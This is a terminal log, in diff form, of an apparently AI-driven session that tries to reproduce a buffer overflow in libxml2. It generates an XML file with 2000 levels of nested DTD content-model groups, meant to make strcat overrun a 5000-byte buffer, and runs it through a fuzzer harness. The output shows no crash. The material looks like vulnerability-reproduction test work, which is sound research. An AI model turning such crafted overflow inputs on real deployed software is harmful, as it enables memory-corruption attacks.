@@ -1,0 +1,32 @@
+Previous response had warnings:
+WARNINGS: - Extra text detected before JSON object
+- Extra text detected after JSON object
+
+New Terminal Output:
+
+root@e38823cb2484:/# cat << 'EOF' > /tmp/gen2.py
+> # The function serializes content models like (a,b,c)
+> # We want a depth/length combination that causes strcat to exceed 5000 bytes.
+> # Let's try deep nesting: (a|(a|(a|...)))
+> s = 'a'
+> for i in range(2000):
+>     s = f'(a|{s})'
+> xml = f'<!DOCTYPE root [\n<!ELEMENT root {s}>\n]>\n<root><b/></root>'
+> with open('/tmp/test2.xml', 'w') as f:
+>     f.write(xml)
+> EOF
+root@e38823cb2484:/# python3 /tmp/gen2.py
+root@e38823cb2484:/# /out/libxml2_xml_read_memory_fuzzer /tmp/test2.xml > /tmp/crash_output.txt 2>&1
+root@e38823cb2484:/# cat /tmp/crash_output.txt
+INFO: Running with entropic power schedule (0xFF, 100).
+INFO: Seed: 371379124
+INFO: Loaded 1 modules   (56424 inline 8-bit counters): 56424 [0xb4d310, 0xb5af78),
+INFO: Loaded 1 PC tables (56424 PCs): 56424 [0x9b68e0,0xa92f60),
+/out/libxml2_xml_read_memory_fuzzer: Running 1 inputs 1 time(s) each.
+Running: /tmp/test2.xml
+Executed /tmp/test2.xml in 9 ms
+***
+*** NOTE: fuzzing was not performed, you have only
+***       executed the target code on a fixed set of inputs.
+***
+root@e38823cb2484:/#
